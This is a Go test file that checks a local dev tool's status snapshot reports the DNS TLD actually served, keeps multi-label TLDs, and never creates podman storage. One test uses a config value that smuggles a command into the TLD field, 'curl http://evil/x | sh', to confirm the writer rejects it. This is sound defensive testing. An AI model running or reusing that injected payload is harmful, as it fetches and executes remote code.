package ui

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/geodro/lerd/internal/dns"
)

// noPodman keeps podman off PATH for a test that builds the status: podman
// follows XDG_DATA_HOME into the temp dir and leaves storage cleanup can't remove.
func noPodman(t *testing.T) {
	t.Helper()
	t.Setenv("PATH", t.TempDir())
}

// writeDNSConfig points the config loader at a temp tree holding the given
// dns.tld, so a reader can be checked against a value the writer refuses.
func writeDNSConfig(t *testing.T, tld string) {
	t.Helper()
	cfgHome := t.TempDir()
	t.Setenv("XDG_CONFIG_HOME", cfgHome)
	t.Setenv("XDG_DATA_HOME", t.TempDir())
	noPodman(t)
	dir := filepath.Join(cfgHome, "lerd")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	body := "dns:\n  enabled: true\n  tld: " + tld + "\n"
	if err := os.WriteFile(filepath.Join(dir, "config.yaml"), []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}

// The status snapshot the dashboard and the tray render has to name the suffix
// the dnsmasq config was written from. Reporting the raw value left the pill
// red forever on a config the writer had refused (#1559).
func TestBuildStatus_ReportsTheServedTLD(t *testing.T) {
	writeDNSConfig(t, `"bad'; curl http://evil/x | sh; #"`)

	if got := buildStatus().DNS.TLD; got != dns.DefaultTLD {
		t.Errorf("status reports tld %q, but the writer serves %q", got, dns.DefaultTLD)
	}
}

// A multi-label suffix is served as written, so the status must carry it rather
// than falling back.
func TestBuildStatus_KeepsAMultiLabelTLD(t *testing.T) {
	writeDNSConfig(t, "internal.example.com")

	if got := buildStatus().DNS.TLD; got != "internal.example.com" {
		t.Errorf("status reports tld %q, want internal.example.com", got)
	}
}

// buildStatus must never reach podman: it would set up rootless storage under
// the test's XDG_DATA_HOME, which the temp dir cleanup cannot delete.
func TestBuildStatus_StartsNoContainerStorage(t *testing.T) {
	writeDNSConfig(t, "test")
	buildStatus()

	if _, err := os.Stat(filepath.Join(os.Getenv("XDG_DATA_HOME"), "containers")); err == nil {
		t.Error("buildStatus set up podman storage under the test's XDG_DATA_HOME")
	}
}
